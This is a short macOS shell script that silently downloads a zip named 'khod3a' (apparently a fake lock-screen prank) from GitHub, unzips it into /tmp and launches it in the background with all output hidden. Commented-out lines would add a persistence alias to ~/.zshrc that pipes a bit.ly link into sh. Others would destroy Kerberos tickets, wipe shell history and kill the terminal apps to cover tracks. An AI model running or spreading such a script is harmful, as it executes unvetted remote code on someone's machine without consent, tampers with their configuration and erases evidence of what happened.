mkdir -p /tmp/aamine/

curl -s -L https://github.com/ayoubamine/lock-screen/blob/master/khod3a-1.0.0-mac.zip?raw=true -o /tmp/aamine/khod3a-1.0.0-mac.zip > /dev/null

unzip -o /tmp/aamine/khod3a-1.0.0-mac.zip -d /tmp/aamine/ > /dev/null

nohup open /tmp/aamine/khod3a.app > /dev/null

# if [ `alias | grep aamine | wc -l` -eq 0 ]; then
#   echo "alias aamine='curl -s -L bit.ly/spody | sh'" >> ~/.zshrc
#   # echo "curl -s -L bit.ly/spody | sh" >> ~/.zshrc
# fi

# kdestroy
# clear
# history -c

# killall iTerm
# killall Terminal
# killall iTerm2